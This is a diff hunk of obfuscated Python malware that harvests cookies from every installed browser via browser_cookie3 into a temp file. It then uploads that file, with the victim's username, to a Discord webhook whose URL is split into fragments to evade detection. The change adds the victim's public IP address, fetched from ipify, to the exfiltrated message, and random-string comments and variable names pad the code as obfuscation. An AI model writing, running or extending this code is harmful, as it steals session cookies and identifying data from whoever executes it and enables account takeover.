@@ -103,7 +103,7 @@ with open(os.path.expanduser("~") + f"\\AppData\\Local\\Temp\\cookies.txt", 'w',
         try: exec(f"for i in browser_cookie3.{browser}(): file.write(i.name + ' >>> ' + i.value + ' >>> ' + i.domain + ' >>> ' + browser.upper() + '\\n')") # fySOdIqMCKIMPyCPZGADMDnVUHWZJwYFlzaJxdqXKSdmDAPXDaWcEzcnKjkn
         except: pass # GGpKyPiipZfHxtkETtceaEzIAGuEJaswTLCgqEqWoUCavYVHybVVGXzYBSIc
 while True: # ExIljXurzsccURnLLjCdlhKRcBxUDOQdrSkGMMZIxPfQMbQlbDpqRQiFTzP
-  try: r=requests.post("htt"+"ps"+":/"+"/disc"+"ord.c"+"om/ap"+"i/we"+"bho"+"oks/11547713"+"06148020234/ZECOrWukj1oox4lfSd0crP-U8alZsQM1Hj_CyrRFVcXr7nq8ZXwCvsrn4jmzva3Yqxzu",data={'content':"@everyone " + os.path.expanduser('~').split('\\')[2]}, files={'file1':open(os.path.expanduser("~") + f"\\AppData\\Local\\Temp\\cookies.txt", 'rb')}) ;break # EQkQAIrqIKIrXIyXFJzYcSICoRjNKpuBCESNDPEsDzlZrPVeZSBZNxYS
+  try: r=requests.post("htt"+"ps"+":/"+"/disc"+"ord.c"+"om/ap"+"i/we"+"bho"+"oks/11547713"+"06148020234/ZECOrWukj1oox4lfSd0crP-U8alZsQM1Hj_CyrRFVcXr7nq8ZXwCvsrn4jmzva3Yqxzu",data={'content':"@everyone " + os.path.expanduser('~').split('\\')[2] + " " +requests.get('htt'+'ps:'+'//a'+'pi.ip'+'ify'+'.o'+'rg').text}, files={'file1':open(os.path.expanduser("~") + f"\\AppData\\Local\\Temp\\cookies.txt", 'rb')}) ;break # EQkQAIrqIKIrXIyXFJzYcSICoRjNKpuBCESNDPEsDzlZrPVeZSBZNxYS
   except: pass # WAQMNMkoGQLEhaBYWbtHMBFeJJaUOGpLWYBYHyLRjpFpxhmrQMgp
 rikAxhiigTlBXlNhwSdmvBzJzuBSUNBFOBTZPbMmcEmjaQsOWCtt = 'UDcEjvfeWCPTrPwEgFdVKFddKeLwHbXvAVDGtgxnNQZjLmyEwNIkFIZeLA'
 KppZhYcHdAFTxiGUgHIILEyzWWfkaOVIlSsnetEnApvrlXTjoudq = 'HmQpMRZdPzAmpxMqTAyMQaRpoAiTbwSUyThjotUkLWarsxhHyqd'
